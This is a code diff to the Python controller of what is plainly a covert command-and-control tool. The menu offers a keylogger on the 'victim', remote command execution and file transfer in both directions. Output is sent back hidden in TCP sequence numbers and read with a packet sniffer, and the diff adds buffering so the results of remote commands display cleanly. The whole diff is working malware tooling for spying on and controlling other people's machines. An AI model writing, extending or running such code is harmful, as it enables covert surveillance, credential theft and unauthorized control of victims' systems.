@@ -93,6 +93,29 @@ class Commander:
         else:
             print("[!] Knock failed. Check if victim is running.")
 
+    def display_output(self, timeout=3):
+        start_time = time.time()
+        last_buffer_len = 0
+        
+        while time.time() - start_time < timeout:
+            time.sleep(0.2)
+            with self.output_lock:
+                if len(self.output_buffer) == last_buffer_len:
+                    # No new data for 0.2 seconds, consider it complete
+                    if last_buffer_len > 0:
+                        break
+                last_buffer_len = len(self.output_buffer)
+        
+        # Print the buffered output
+        with self.output_lock:
+            if self.output_buffer:
+                print(self.output_buffer, end='')
+                self.output_buffer = ""
+            else:
+                print("[No output]")
+        
+        print("="*50 + "\n")
+
     def start_output_listener(self):
         """Continuous sniffer for the RX port to print covert data."""
         def process_packet(pkt):
@@ -100,7 +123,7 @@ class Commander:
                 char_code = pkt[TCP].seq % 256
                 if char_code != 0:
                     with self.output_lock:
-                        print(chr(char_code), end="", flush=True)
+                        self.output_buffer += chr(char_code)
 
         try:
             sniff(
@@ -111,7 +134,6 @@ class Commander:
         except Exception as e:
             if self.is_connected:
                 print(f"\n[!] Listener error: {e}")
-
     # === Connected Menu Actions ===
     
     def handle_start_keylogger(self):
@@ -135,11 +157,19 @@ class Commander:
 
     def handle_exec(self):
         """Option 4: Run program and display output."""
-        cmd = input("shell> ")
-        if cmd.strip():
-            print(f"[*] Executing '{cmd}'... (Output will appear below)")
-            self.send_covert_command("EXEC", cmd)
-            time.sleep(0.5)
+        cmd = input("shell> ").strip()
+        if not cmd:
+            return
+        
+        # Clear any previous output
+        with self.output_lock:
+            self.output_buffer = ""
+        
+        print(f"[*] Executing '{cmd}' on victim...")
+        self.send_covert_command("EXEC", cmd)
+        
+        # Wait for and display output
+        self.display_output(timeout=5)
 
     def handle_put_file(self):
         """Option 5: Transfer a file TO the victim."""
@@ -215,7 +245,7 @@ class Commander:
         print("0) Exit")
 
     def show_connected_menu(self):
-        """Display menu when connected to victim."""
+        os.system('clear' if os.name == 'posix' else 'cls')
         print(f"\n=== Covert C2 Commander ===")
         print(f"[CONNECTED] -> {self.target_ip}")
         print("\n1. Start Keylogger          6. Transfer File FROM Victim")
